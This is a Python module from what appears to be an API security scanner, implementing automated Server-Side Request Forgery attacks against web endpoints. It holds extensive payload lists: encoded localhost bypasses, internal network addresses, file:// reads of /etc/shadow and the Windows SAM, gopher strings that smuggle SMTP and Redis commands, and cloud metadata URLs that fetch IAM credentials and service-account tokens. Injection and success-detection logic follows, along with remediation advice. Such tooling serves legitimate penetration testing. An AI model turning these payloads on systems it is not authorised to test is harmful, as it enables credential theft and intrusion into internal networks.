"""
SSRF (Server-Side Request Forgery) attack module.

Tests API endpoints for SSRF vulnerabilities by injecting URLs
that the server might fetch, potentially accessing internal resources.

v1.0.0 Enhancements:
- Advanced bypass techniques (DNS rebinding, URL encoding)
- Blind SSRF detection with callback URLs
- Cloud metadata service detection
- Protocol handlers testing
- Time-based detection for blind SSRF
- crAPI/OWASP benchmark coverage
"""

import json
import re
import time
from typing import Any
from urllib.parse import quote

import requests

from ..models import (
    AttackResult,
    AttackType,
    Endpoint,
    Parameter,
    Severity,
    Vulnerability,
)


class SSRFAttacker:
    """Performs SSRF attacks on API endpoints.

    Supports multiple attack techniques:
    - Direct internal network access
    - DNS rebinding bypass
    - URL encoding bypass
    - Protocol handlers (file://, gopher://, etc.)
    - Cloud metadata extraction
    - Blind SSRF with out-of-band detection
    """

    # SSRF payloads organized by category
    PAYLOADS = {
        # Localhost variations - most common bypass attempts
        "localhost": [
            # Standard localhost
            "http://localhost",
            "http://127.0.0.1",
            "http://[::1]",
            "http://localhost.localdomain",
            # IPv6 localhost
            "http://[0:0:0:0:0:0:0:1]",
            "http://[0000:0000:0000:0000:0000:0000:0000:0001]",
            # Port variations
            "http://localhost:80",
            "http://localhost:443",
            "http://localhost:22",
            "http://localhost:21",
            "http://localhost:25",
            "http://localhost:3306",
            "http://localhost:5432",
            "http://localhost:6379",
            "http://localhost:8080",
            "http://localhost:3000",
            "http://localhost:5000",
            # 127.x.x.x range
            "http://127.0.0.1",
            "http://127.0.1.1",
            "http://127.1.0.1",
            "http://127.0.0.2",
            "http://127.127.127.127",
            # Decimal IP (2130706433 = 127.0.0.1)
            "http://2130706433",
            "http://2130706433:80",
            # Hexadecimal IP
            "http://0x7f000001",
            "http://0x7f.0x00.0x00.0x01",
            "http://0x7f000001:80",
            # Octal IP
            "http://0177.0.0.1",
            "http://0177.0.0.1:80",
            "http://017700000001",
            # Shortened IP
            "http://127.1",
            "http://127.0.1",
            # URL encoded localhost
            "http://%6c%6f%63%61%6c%68%6f%73%74",
            "http://%31%32%37%2e%30%2e%30%2e%31",
        ],

        # Internal network ranges
        "internal": [
            # Private IPv4 ranges
            "http://192.168.0.1",
            "http://192.168.1.1",
            "http://192.168.1.100",
            "http://192.168.100.1",
            "http://10.0.0.1",
            "http://10.0.1.1",
            "http://10.1.1.1",
            "http://172.16.0.1",
            "http://172.16.1.1",
            "http://172.31.255.255",
            # Link-local
            "http://169.254.169.254",
            "http://169.254.1.1",
            # Internal service discovery
            "http://internal",
            "http://internal.local",
            "http://intranet",
            "http://intranet.local",
            "http://gateway",
            "http://router",
            "http://docker",
            "http://kubernetes",
            "http://kubernetes.default",
            "http://kubernetes.default.svc",
        ],

        # DNS rebinding and domain-based bypass
        "dns_bypass": [
            # nip.io wildcard DNS
            "http://127.0.0.1.nip.io",
            "http://localhost.nip.io",
            "http://internal.nip.io",
            # localtest.me
            "http://localtest.me",
            "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
            # Other wildcard DNS services
            "http://127.0.0.1.xip.io",
            "http://spoofed.burpcollaborator.net",
            # Custom domain tricks
            "http://localhost.evil.com",
            "http://127.0.0.1.evil.com",
            "http://a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.x.y.z.127.0.0.1",
        ],

        # Protocol-based SSRF
        "protocols": [
            # File protocol
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///etc/shadow",
            "file:///proc/self/environ",
            "file:///proc/self/cmdline",
            "file:///var/log/auth.log",
            "file:///c:/windows/win.ini",
            "file:///c:/windows/system32/config/sam",
            # Gopher protocol
            "gopher://127.0.0.1:70",
            "gopher://127.0.0.1:25/_HELO%20localhost%0AMAIL%20FROM:%20root@localhost%0ARCPT%20TO:%20root@localhost%0ADATA%0ASubject:%20test%0A%0Atest%0A.%0AQUIT%0A",
            "gopher://127.0.0.1:6379/_INFO",
            "gopher://127.0.0.1:11211/_stats",
            # Dict protocol
            "dict://127.0.0.1:11211/stat",
            "dict://127.0.0.1:6379/info",
            # Other protocols
            "sftp://127.0.0.1",
            "ldap://127.0.0.1",
            "tftp://127.0.0.1:69",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "data:text/plain;base64,SGVsbG8gV29ybGQ=",
            # Netdoc (Java)
            "netdoc:///etc/passwd",
        ],

        # Cloud metadata endpoints
        "cloud_metadata": [
            # AWS IMDSv1
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/ami-id",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
            "http://169.254.169.254/latest/user-data",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            # AWS IMDSv2 (requires token, but still testable)
            "http://169.254.169.254/latest/api/token",
            # GCP
            "http://metadata.google.internal/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            # Azure
            "http://169.254.169.254/metadata/v1/",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            # DigitalOcean
            "http://169.254.169.254/metadata/v1/dns/nameservers",
            "http://169.254.169.254/metadata/v1/hostname",
            "http://169.254.169.254/metadata/v1/user-data",
            # Alibaba Cloud
            "http://100.100.100.200/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/hostname",
            "http://100.100.100.200/latest/meta-data/instance-id",
            # Oracle Cloud
            "http://169.254.169.254/opc/v1/instance/",
            "http://169.254.169.254/opc/v1/instance/metadata/",
            # OpenStack
            "http://169.254.169.254/openstack/latest/meta_data.json",
            "http://169.254.169.254/openstack/latest/user_data",
            # Kubernetes
            "http://kubernetes.default.svc/api/v1/namespaces/default/secrets",
            "http://kubernetes.default.svc/api/v1/namespaces/default/pods",
        ],

        # URL encoding bypass techniques
        "encoding_bypass": [
            # Double URL encoding
            "http://%25%36%31%25%36%33%25%37%34%25%37%35%25%36%31%25%36%63.org",  # actua1.org
            # Case variations
            "HTTP://localhost",
            "HtTp://localhost",
            "http://LOCALHOST",
            # Backslash variations
            "http://localhost\\@evil.com",
            "http://evil.com\\@localhost",
            # Unicode bypass
            "http://loc�lhost",
            "http://ｌｏｃａｌｈｏｓｔ",  # Fullwidth characters
            # Newline injection
            "http://localhost%0d%0a.evil.com",
            "http://evil.com%0d%0alocalhost",
            # Tab injection
            "http://localhost%09.evil.com",
            # At-sign abuse
            "http://evil.com@localhost",
            "http://localhost@evil.com",
            "http://user:pass@localhost",
        ],

        # crAPI specific endpoints (for benchmark testing)
        "crapi_specific": [
            "http://localhost:8080",
            "http://localhost:8082",
            "http://crapi-identity:8080",
            "http://crapi-workshop:8080",
            "http://internal:8080",
        ],
    }

    # Indicators of successful SSRF
    SUCCESS_INDICATORS = [
        # AWS metadata
        "ami-id",
        "ami-launch-index",
        "ami-manifest-path",
        "instance-id",
        "instance-type",
        "local-hostname",
        "local-ipv4",
        "mac",
        "placement/",
        "security-groups",
        "iam/",
        "accessKeyId",
        "secretAccessKey",
        "token",

        # GCP metadata
        "project-id",
        "numeric-project-id",
        "project/project-id",
        "instance/",
        "machine-type",
        "zone",
        "service-accounts",

        # Azure metadata
        "azEnvironment",
        "location",
        "name",
        "resourceGroupName",
        "subscriptionId",
        "vmId",
        "vmScaleSetName",

        # File system indicators
        "root:",
        "/bin/bash",
        "/bin/sh",
        "daemon:",
        "nobody:",
        "sshd_config",
        "passwd",

        # Network indicators
        "SSH-2.0",
        "HTTP/1.",
        "<!DOCTYPE",
        "<html",
        "Server:",
        "220 ",
        "230 ",
        "530 ",

        # Error messages that reveal internal access
        "Connection refused",
        "Connection timed out",
        "No route to host",
        "Name or service not known",
        "curl:",
        "requests.exceptions",
        "urllib.error",
        "socket.gaierror",
        "getaddrinfo failed",
        "Failed to connect",
        "Network is unreachable",

        # Database responses
        "MySQL",
        "PostgreSQL",
        "MongoDB",
        "Redis",
        "memcached",
    ]

    def __init__(self, target_url: str, timeout: int = 5, callback_url: str | None = None):
        """Initialize the SSRF attacker.

        Args:
            target_url: Base URL of the target API
            timeout: Request timeout in seconds
            callback_url: URL to use for out-of-band testing (optional)
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.callback_url = callback_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Sentinel/1.0.0 Security Scanner',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
        })

        # Baseline response times for time-based detection
        self.baseline_response_times: dict[str, float] = {}

    def attack(
        self,
        endpoint: Endpoint,
        parameters_to_test: list[str] | None = None,
        auth_token: str | None = None
    ) -> list[AttackResult]:
        """Perform SSRF attacks on an endpoint.

        Args:
            endpoint: The endpoint to attack
            parameters_to_test: Specific parameter names to test
            auth_token: Authentication token (optional)

        Returns:
            List of attack results
        """
        results: list[AttackResult] = []

        # Handle API misuse (list passed as auth_token)
        if auth_token is not None and isinstance(auth_token, list):
            parameters_to_test = auth_token
            auth_token = None

        if auth_token:
            self.session.headers['Authorization'] = f"Bearer {auth_token}"

        # Get testable parameters
        params_to_test = self._get_testable_parameters(endpoint, parameters_to_test)

        if not params_to_test:
            return results

        # Establish baseline for time-based detection
        self._establish_baseline(endpoint)

        # Test each parameter
        for param in params_to_test:
            # Phase 1: Quick localhost tests
            for payload in self.PAYLOADS["localhost"][:5]:
                result = self._test_payload(endpoint, param, payload)
                results.append(result)

                if result.success:
                    # Found vulnerability, test more payloads
                    for adv_payload in self.PAYLOADS["dns_bypass"][:3]:
                        results.append(self._test_payload(endpoint, param, adv_payload))
                    break

            # Phase 2: Cloud metadata tests (high priority)
            for payload in self.PAYLOADS["cloud_metadata"][:6]:
                result = self._test_payload(endpoint, param, payload)
                results.append(result)

                if result.success:
                    # Found cloud metadata access - critical finding
                    break

            # Phase 3: Protocol handlers
            for payload in self.PAYLOADS["protocols"][:4]:
                result = self._test_payload(endpoint, param, payload)
                results.append(result)

            # Phase 4: Internal network
            for payload in self.PAYLOADS["internal"][:3]:
                result = self._test_payload(endpoint, param, payload)
                results.append(result)

            # Phase 5: Encoding bypass attempts
            if any(r.success for r in results):
                for payload in self.PAYLOADS["encoding_bypass"][:3]:
                    results.append(self._test_payload(endpoint, param, payload))

        return results

    def _get_testable_parameters(
        self,
        endpoint: Endpoint,
        parameters_to_test: list[str] | None
    ) -> list[Parameter]:
        """Get list of parameters that might be vulnerable to SSRF."""
        params = []

        # URL-related parameter names (most likely SSRF targets)
        url_param_names = [
            'url', 'uri', 'link', 'src', 'source', 'target', 'redirect',
            'next', 'return', 'returnUrl', 'return_url', 'callback',
            'feed', 'file', 'path', 'domain', 'host', 'site', 'website',
            'proxy', 'request', 'fetch', 'load', 'page', 'image', 'img',
            'webhook', 'endpoint', 'server', 'api', 'resource', 'document',
            'import', 'include', 'template', 'preview', 'export', 'pdf',
            'report', 'data', 'content', 'body', 'html', 'text', 'xml'
        ]

        for param in endpoint.parameters:
            if parameters_to_test and param.name not in parameters_to_test:
                continue

            # Check if parameter name suggests URL handling
            param_lower = param.name.lower()
            if any(url_param in param_lower for url_param in url_param_names):
                params.append(param)
            # Also test string parameters
            elif param.param_type == 'string':
                params.append(param)

        # Check request body for URL fields
        if endpoint.request_body:
            body_params = self._extract_url_body_parameters(endpoint.request_body)
            for param_name in body_params:
                params.append(Parameter(
                    name=param_name,
                    location='body',
                    param_type='string'
                ))

        return params

    def _extract_url_body_parameters(self, request_body: dict) -> list[str]:
        """Extract URL-related parameter names from request body."""
        params = []

        content = request_body.get('content', {})
        for content_type, content_schema in content.items():
            if 'application/json' in content_type:
                schema = content_schema.get('schema', {})
                properties = schema.get('properties', {})

                # Look for URL-related fields
                url_fields = ['url', 'uri', 'link', 'callback', 'webhook', 'image',
                             'website', 'endpoint', 'server', 'host', 'domain']
                for prop_name in properties.keys():
                    if any(field in prop_name.lower() for field in url_fields):
                        params.append(prop_name)

        return params

    def _establish_baseline(self, endpoint: Endpoint):
        """Establish baseline response times for time-based detection."""
        try:
            url = f"{self.target_url}{endpoint.path}"

            # Make a normal request to establish baseline
            start = time.time()
            self.session.request(
                endpoint.method.value,
                url,
                timeout=self.timeout
            )
            elapsed = time.time() - start

            self.baseline_response_times[endpoint.path] = elapsed
        except Exception:
            self.baseline_response_times[endpoint.path] = 1.0

    def _test_payload(self, endpoint: Endpoint, param: Parameter, payload: str) -> AttackResult:
        """Test a single SSRF payload."""
        start_time = time.time()

        try:
            url = f"{self.target_url}{endpoint.path}"

            # Build request based on method and parameter location
            headers = {}
            params = {}
            json_body = {}
            data = None

            # Add other required parameters with default values
            for p in endpoint.parameters:
                if p.name == param.name:
                    continue
                default = self._get_default_value(p)
                if p.location == 'query':
                    params[p.name] = default
                elif p.location == 'header':
                    headers[p.name] = str(default)
                elif p.location == 'body':
                    json_body[p.name] = default

            # Inject the SSRF payload
            if param.location == 'query':
                params[param.name] = payload
            elif param.location == 'header':
                headers[param.name] = payload
            elif param.location == 'body':
                json_body[param.name] = payload
            elif param.location == 'path':
                # Replace path parameter
                url = url.replace(f"{{{param.name}}}", quote(payload, safe=''))

            # Make the request
            response = self.session.request(
                endpoint.method.value,
                url,
                params=params if params else None,
                headers=headers if headers else None,
                json=json_body if json_body else None,
                data=data,
                timeout=self.timeout,
                allow_redirects=False
            )

            duration_ms = (time.time() - start_time) * 1000

            # Check for SSRF vulnerability
            is_vulnerable, ssrf_type, evidence = self._check_ssrf_vulnerability(
                response, payload, duration_ms
            )

            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.SSRF,
                success=is_vulnerable,
                payload=payload,
                response_status=response.status_code,
                response_body=response.text[:1000],
                duration_ms=duration_ms,
                extra_data={
                    'ssrf_type': ssrf_type,
                    'evidence': evidence,
                    'param_name': param.name,
                    'param_location': param.location
                } if is_vulnerable else None
            )

        except requests.exceptions.Timeout:
            # Timeout might indicate successful connection to internal service
            duration_ms = (time.time() - start_time) * 1000
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.SSRF,
                success=True,  # Potential blind SSRF
                payload=payload,
                error_message="Request timed out (potential blind SSRF)",
                duration_ms=duration_ms,
                extra_data={'ssrf_type': 'blind_timeout'}
            )
        except requests.exceptions.ConnectionError as e:
            # Connection errors might still indicate SSRF attempt was made
            duration_ms = (time.time() - start_time) * 1000
            error_msg = str(e).lower()

            # Check if error suggests server attempted to connect
            if any(indicator in error_msg for indicator in ['connection refused', 'reset', 'timeout']):
                return AttackResult(
                    endpoint=endpoint,
                    attack_type=AttackType.SSRF,
                    success=True,
                    payload=payload,
                    error_message=f"Connection error suggests SSRF attempt: {str(e)[:200]}",
                    duration_ms=duration_ms,
                    extra_data={'ssrf_type': 'connection_error', 'error': str(e)[:200]}
                )

            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.SSRF,
                success=False,
                payload=payload,
                error_message=str(e)[:200],
                duration_ms=duration_ms
            )
        except Exception as e:
            duration_ms = (time.time() - start_time) * 1000
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.SSRF,
                success=False,
                payload=payload,
                error_message=str(e)[:200],
                duration_ms=duration_ms
            )

    def _get_default_value(self, param: Parameter) -> Any:
        """Get a default value for a parameter."""
        if param.example:
            return param.example

        defaults = {
            'string': 'test',
            'integer': 1,
            'number': 1.0,
            'boolean': True,
            'array': [],
            'object': {}
        }
        return defaults.get(param.param_type, 'test')

    def _check_ssrf_vulnerability(
        self,
        response: requests.Response,
        payload: str,
        duration_ms: float
    ) -> tuple[bool, str, str | None]:
        """Check if response indicates SSRF vulnerability.

        Returns:
            Tuple of (is_vulnerable, ssrf_type, evidence)
        """
        response_text = response.text.lower()

        # Check for cloud metadata indicators (highest severity)
        cloud_indicators = [
            # AWS
            ('ami-id', 'AWS metadata', 'critical'),
            ('instance-id', 'AWS metadata', 'critical'),
            ('iam/security-credentials', 'AWS IAM credentials', 'critical'),
            ('accesskeyid', 'AWS access key', 'critical'),
            ('secretaccesskey', 'AWS secret key', 'critical'),
            # GCP
            ('project-id', 'GCP metadata', 'critical'),
            ('computemetadata', 'GCP metadata', 'critical'),
            ('service-accounts', 'GCP service account', 'critical'),
            # Azure
            ('azenvironment', 'Azure metadata', 'critical'),
            ('subscriptionid', 'Azure subscription', 'critical'),
            ('vmid', 'Azure VM ID', 'high'),
        ]

        for indicator, meta_type, severity in cloud_indicators:
            if indicator in response_text:
                return True, f'cloud_metadata_{severity}', f"Found {meta_type} in response"

        # Check for file system indicators
        file_indicators = [
            ('root:', '/etc/passwd', 'Unix password file'),
            ('daemon:', '/etc/passwd', 'Unix password file'),
            ('bin:', '/etc/passwd', 'Unix password file'),
            ('nobody:', '/etc/passwd', 'Unix password file'),
            ('[boot loader]', 'Windows boot.ini', 'Windows config'),
            ('[fonts]', 'Windows win.ini', 'Windows config'),
            ('<?xml', 'XML file', 'Configuration file'),
        ]

        for indicator, source, description in file_indicators:
            if indicator in response_text and len(response.text) < 5000:
                return True, 'file_read', f"Read {source}: {description}"

        # Check for network service indicators
        network_indicators = [
            ('ssh-2.0', 'SSH service', 'SSH banner'),
            ('220 ', 'FTP/SMTP', 'FTP/SMTP banner'),
            ('+ok', 'POP3', 'POP3 banner'),
            ('* ok', 'IMAP', 'IMAP banner'),
            ('redis_version', 'Redis', 'Redis info'),
            ('stats', 'Memcached', 'Memcached stats'),
            ('stat item', 'Memcached', 'Memcached item'),
            ('mongodb', 'MongoDB', 'MongoDB response'),
            ('mysql', 'MySQL', 'MySQL response'),
            ('postgresql', 'PostgreSQL', 'PostgreSQL response'),
        ]

        for indicator, service, description in network_indicators:
            if indicator in response_text:
                return True, 'network_scan', f"Accessed {service}: {description}"

        # Check for error messages that reveal internal access attempts
        error_indicators = [
            'connection refused',
            'connection timed out',
            'no route to host',
            'name or service not known',
            'network is unreachable',
            'getaddrinfo failed',
            'failed to connect',
            'couldn\'t resolve host',
            'could not resolve host',
            'connection reset',
            'socket error',
        ]

        for indicator in error_indicators:
            if indicator in response_text:
                return True, 'network_error', f"Server attempted to connect: {indicator}"

        # Check for response time anomalies (time-based blind SSRF)
        baseline = self.baseline_response_times.get('default', 1.0)
        response_time = duration_ms / 1000

        # If response took significantly longer than baseline, might be blind SSRF
        if response_time > baseline * 3 and response_time > 2:
            return True, 'blind_time_based', f"Response time anomaly: {response_time:.2f}s vs baseline {baseline:.2f}s"

        # Check for internal IP addresses exposed in response
        internal_patterns = [
            r'192\.168\.\d{1,3}\.\d{1,3}',
            r'10\.\d{1,3}\.\d{1,3}\.\d{1,3}',
            r'172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}',
            r'127\.0\.0\.1',
            r'localhost',
            r'::1',
            r'169\.254\.\d{1,3}\.\d{1,3}',
        ]

        for pattern in internal_patterns:
            if re.search(pattern, response_text):
                # Verify it's not just the payload reflected
                if payload.lower() not in response_text or len(response_text) > len(payload) * 2:
                    return True, 'internal_ip_exposed', "Internal IP exposed in response"

        # Check for JSON responses that might contain internal data
        if response.status_code in [200, 201, 202]:
            try:
                data = response.json()
                data_str = json.dumps(data).lower()

                # Check for sensitive fields in JSON response
                sensitive_fields = [
                    'internal_host', 'internal_ip', 'private_ip',
                    'server_ip', 'backend_url', 'upstream',
                    'debug_info', 'stack_trace', 'error_detail'
                ]

                for field in sensitive_fields:
                    if field in data_str:
                        return True, 'internal_data_exposed', f"Field '{field}' found in response"

            except (json.JSONDecodeError, ValueError):
                pass

        # Check if response contains URL-like content suggesting server fetched it
        if 'http://' in response_text or 'https://' in response_text:
            # Check if it looks like fetched content
            if len(response_text) > 500 and ('<html' in response_text or '<!doctype' in response_text):
                return True, 'url_fetch', "Server fetched and returned content from URL"

        return False, '', None

    def create_vulnerability(self, result: AttackResult, endpoint: Endpoint) -> Vulnerability:
        """Create a Vulnerability object from an attack result."""
        ssrf_type = 'basic'
        evidence = ''
        param_name = ''
        param_location = ''

        if result.extra_data:
            ssrf_type = result.extra_data.get('ssrf_type', 'basic')
            evidence = result.extra_data.get('evidence', '')
            param_name = result.extra_data.get('param_name', '')
            param_location = result.extra_data.get('param_location', '')

        # Determine severity based on SSRF type
        severity = Severity.HIGH
        if 'critical' in ssrf_type or 'cloud_metadata' in ssrf_type:
            severity = Severity.CRITICAL
        elif 'file_read' in ssrf_type:
            severity = Severity.CRITICAL
        elif 'blind' in ssrf_type:
            severity = Severity.MEDIUM
        elif 'network_error' in ssrf_type:
            severity = Severity.MEDIUM

        # Build detailed description
        description = f"Server-Side Request Forgery (SSRF) vulnerability detected in parameter '{param_name}'. "

        if 'cloud_metadata' in ssrf_type:
            description += (
                f"The server can be tricked into accessing cloud metadata endpoints, "
                f"potentially exposing sensitive credentials and instance information. "
                f"Evidence: {evidence}"
            )
        elif 'file_read' in ssrf_type:
            description += (
                f"The server can be tricked into reading local files using file:// protocol or path traversal. "
                f"Evidence: {evidence}"
            )
        elif 'network_scan' in ssrf_type:
            description += (
                f"The server can be used to scan internal network services. "
                f"Evidence: {evidence}"
            )
        elif 'blind' in ssrf_type:
            description += (
                f"Blind SSRF detected - the server appears to make requests to arbitrary URLs "
                f"without directly reflecting the response. Time-based detection suggests internal access. "
                f"Evidence: {evidence}"
            )
        else:
            description += (
                f"The server can be tricked into making requests to arbitrary URLs, "
                f"potentially accessing internal services. "
                f"Evidence: {evidence}"
            )

        return Vulnerability(
            endpoint=endpoint,
            attack_type=AttackType.SSRF,
            severity=severity,
            title=f"Server-Side Request Forgery (SSRF) in {endpoint.full_path}",
            description=description,
            payload=result.payload or "",
            proof_of_concept=(
                f"Request: {endpoint.method.value} {endpoint.path}\n"
                f"Parameter: {param_name} ({param_location})\n"
                f"Payload: {result.payload}\n"
                f"SSRF Type: {ssrf_type}\n"
                f"Evidence: {evidence}\n"
                f"Response Status: {result.response_status}\n"
                f"Response Preview: {result.response_body[:200] if result.response_body else 'N/A'}..."
            ),
            recommendation=(
                "1. URL Allowlist: Only allow specific, validated URLs/domains\n"
                "2. Block Internal IPs: Deny requests to private IP ranges (RFC 1918):\n"
                "   - 10.0.0.0/8\n"
                "   - 172.16.0.0/12\n"
                "   - 192.168.0.0/16\n"
                "   - 127.0.0.0/8\n"
                "   - 169.254.0.0/16 (cloud metadata)\n"
                "3. Block Cloud Metadata: Explicitly block 169.254.169.254\n"
                "4. Protocol Restrictions: Only allow http:// and https://\n"
                "5. Use IMDSv2: For AWS, require IMDSv2 tokens for metadata access\n"
                "6. Network Segmentation: Isolate services from internal networks\n"
                "7. Input Validation: Validate URL format and domain before processing\n"
                "8. Use a dedicated HTTP client library with SSRF protections"
            ),
            cwe_id="CWE-918",
            owasp_category="A10:2021 - Server-Side Request Forgery",
            response_evidence=result.response_body,
            cvss_score=9.8 if severity == Severity.CRITICAL else (8.6 if severity == Severity.HIGH else 6.5),
            references=[
                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                "https://portswigger.net/web-security/ssrf",
                "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery",
                "https://github.com/assetnote/blind-ssrf-chains"
            ]
        )
